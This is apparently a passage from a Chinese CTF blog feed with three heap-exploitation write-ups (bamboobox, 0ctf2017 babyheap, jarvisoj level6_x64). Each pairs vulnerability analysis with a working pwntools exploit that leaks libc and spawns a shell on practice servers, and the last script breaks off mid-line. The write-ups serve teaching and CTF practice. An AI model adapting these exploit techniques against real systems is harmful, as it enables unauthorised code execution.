函数中并没有对输入的内容 size 进行检查，存在堆溢出</p><p>remove()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201192000543.png" alt="image-20220119200014470"></p><h2 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/112602827">unlink 基本知识</a></p><p>新版 unlink 要求</p><blockquote><p>// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致 (size 检查)<br>if (__builtin_expect (chunksize§ != prev_size (next_chunk§), 0))      <br>malloc_printerr (“corrupted size vs. prev_size”);               \</p><p>// 检查 fd 和 bk 指针 (双向链表完整性检查)<br>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      <br>malloc_printerr (check_action, “corrupted double-linked list”, P, AV);  \</p><p>//largebin 中 next_size 双向链表完整性检查<br> if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)              <br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    <br>malloc_printerr (check_action,                                      <br>“corrupted double-linked list (not small)”,    <br>P, AV);</p></blockquote><p>利用思路：</p><ul><li>构造 fake_chunk</li><li>通过 unlink，把 chunk 移到存储 chunk 指针的内存处</li><li>覆盖 chunk 0 指针为 atoi@got 表地址并泄露</li><li>覆盖 atoi 的 got 表为 system 函数地址。</li><li>给出参数 ‘/bin/sh’，调用 atoi 函数拿 shell。</li></ul><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27663</span>)</span><br><span class="line"><span class="comment"># r=process(&#x27;./bamboobox&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,name</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,name</span>):</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x6020C8</span>  <span class="comment">#存放chunk指针的数组在bss段上的地址</span></span><br><span class="line"><span class="comment">#这里我们绕过第一个检查 (检查p和其前后的chunk是否构成双向链表)</span></span><br><span class="line">fake_chunk =  p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)  <span class="comment">#fake_chunk header</span></span><br><span class="line">fake_chunk += p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>) <span class="comment">#fake_chunk fd  bk</span></span><br><span class="line">fake_chunk += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x40</span>) <span class="comment"># 1的presize </span></span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>) <span class="comment"># 1的size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment">#前向合并，合并0中的fake_chunk  放入 unsorted bin 中 ,同时 ptr = &amp;itemlist0_ptr -0x18</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) <span class="comment">#覆盖的itemlist[0]-&gt;ptr 为atoi_got</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/113105091">https://blog.csdn.net/mcmuyanga/article/details/113105091</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0ctf2017-babyheap</title>
      <link href="/2022/01/14/0ctf_2017_babyheap/"/>
      <url>/2022/01/14/0ctf_2017_babyheap/</url>
      
        <content type="html"><![CDATA[<p>fastbin attack</p><span id="more"></span><h2 id="0x01-程序分析"><a class="markdownIt-Anchor" href="#0x01-程序分析">#</a> 0x01 程序分析</h2><p>例行检查，64 位程序，保护全开</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142234035.png" alt="image-20220114223429901"></p><p>ida 查看 main 函数，菜单题</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142237640.png" alt="image-20220114223706573"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142308074.png" alt="image-20220114230844952"></p><p>sub_D48：对应 Allocate 申请内存地址用来存放结构体，申请内存用的是 calloc</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142305611.png" alt="image-20220114230534549"></p><p>sub_E7F：对应编辑 edit，这里没有检查 size ，存在堆溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142329754.png" alt="image-20220114232935653"></p><p>sub_F50: 对应 delete，free 后指针清零不存在 UAF</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201142336137.png" alt="image-20220114233654889"></p><p>sub_1051 就是 puts 打印</p><h2 id="0x02-思路"><a class="markdownIt-Anchor" href="#0x02-思路">#</a> 0x02 思路</h2><p>利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写</p><h2 id="0x03-exp"><a class="markdownIt-Anchor" href="#0x03-exp">#</a> 0x03 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./0ctf_2017_babyheap&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26060</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allo</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">content = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(content))</span><br><span class="line">libc_base = (content) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x3C4AED</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-参考文章"><a class="markdownIt-Anchor" href="#0x04-参考文章">#</a> 0x04 参考文章</h2><p><a href="https://blog.csdn.net/qq_43935969/article/details/115877748">https://blog.csdn.net/qq_43935969/article/details/115877748</a></p><p><a href="https://www.cnblogs.com/Rookle/p/12901747.html">https://www.cnblogs.com/Rookle/p/12901747.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj_level6_x64</title>
      <link href="/2022/01/13/jarvisoj_level6_x64/"/>
      <url>/2022/01/13/jarvisoj_level6_x64/</url>
      
        <content type="html"><![CDATA[<p>double free，unlink 覆写 got 表</p><span id="more"></span><h3 id="0x01-程序分析"><a class="markdownIt-Anchor" href="#0x01-程序分析">#</a> 0x01 程序分析</h3><p>主函数：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201121227754.png" alt="image-20220112122741514"></p><p>之后</p><p>sub_400A49：用户初始堆分配</p><p>sub_400998：要求输入一个操作选项</p><p>sub_400B14：遍历索引打印所有标号和记录内容</p><p>sub_400BC2:  要求输入记录的内容长度和记录内容，然后检测输入长度是否超过最大值，正常则 malloc 一个堆块用来存储记录，然后按输入的长度读取记录内容到堆块：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132322174.png" alt="image-20220113232257966"></p><p>sub_400D87：编辑，是一个 realloc，可以泄露堆溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132329164.png" alt="image-20220113232933077"></p><p>堆 v2 也就是 size 进行了要求，在最后的 sub_40085D 函数中进行了内容读取，这里没有将字符串结束符读进来因此可以进行内存泄露，泄露偏移和 system 地址。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132339024.png" alt="image-20220113233902963"></p><p>sub_400f7d：删除功能，依据标号找到相应的记录然后重置索引表为未使用态并 free 掉堆块，存在 double free 漏洞</p><blockquote><p>unlink 思路</p><ul><li>利用 <code>unsorted bin</code>  的 <code>fd</code>  指针分别泄露出 <code>heap</code>  地址和 <code>libc</code>  地址，这样就得到了最初那个 <code>0x1820</code>  大小的 <code>chunk</code>  的地址</li><li>利用 <code>realloc</code>  功能来构造 <code>unlink</code>  条件，结合 <code>uaf</code>  漏洞，修改某个 <code>ptr</code>  为 <code>ptr - 0x18</code> ，这个 <code>ptr</code>  在 <code>0x1820</code>  堆块上</li><li>利用 <code>edit</code>  修改 <code>atoi@got</code>  为 <code>system</code>  地址</li><li>输入 <code>/bin/sh</code>  拿 <code>shell</code></li></ul></blockquote><h3 id="0x02-漏洞利用"><a class="markdownIt-Anchor" href="#0x02-漏洞利用">#</a> 0x02 漏洞利用</h3><p>添加四个 Note，释放 note [0] 和 note [2]，此时 note [0] 的 bk 指向 note [2] 的 chunk，note [2] 的 bk 指向 main_arena+0x58（两个 chunk 都进入 unsorted bin）<br>再次添加 2 个 note，payload 长度为 8，注意结尾不要是 \x00<br> 利用 list 泄露 NOTE 管理块的地址和 libc 基地址<br>将四个 note 全部删除<br>添加一个 note，长度要能包含进最开始的 3 个 note 的 chunk<br> 伪造一个 chunk，大小为 0x80，fd 为 note [0]-0x18， bk 为 note [0]-0x10，利用 unlink 把 NOTE 管理块中 note [0] 的地址改为 note [0]-0x18<br> 把 note [0] 改为 atoi 的 got，然后编辑 note [0]，改为 system 地址<br>输入 /bin/sh，获取 shell</p><p>先申请 4 个 chunk，然后 free (0) 和 free (2)，防止合并；然后在申请 2 个 chunk，只写入 8 字节，就可以 leak 出 heap 和 libc 的基地址；<br> 在 heap 基地址偏移 0x30 的地方有我们需要的 NOTE 管理块的地址</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132325326.png" alt="image-20220113232517240"></p><h3 id="0x03-exp"><a class="markdownIt-Anchor" href="#0x03-exp">#</a> 0x03 EXP</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./freenote_x64&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.buuoj.cn&#x27;,28735)</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./freenote_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">List</span>():</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">cont</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Length of new note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(cont)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">num,cont</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Length of note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(cont)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">num</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;11111111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;22222222&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">List</span>()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;11111111&#x27;</span>)</span><br><span 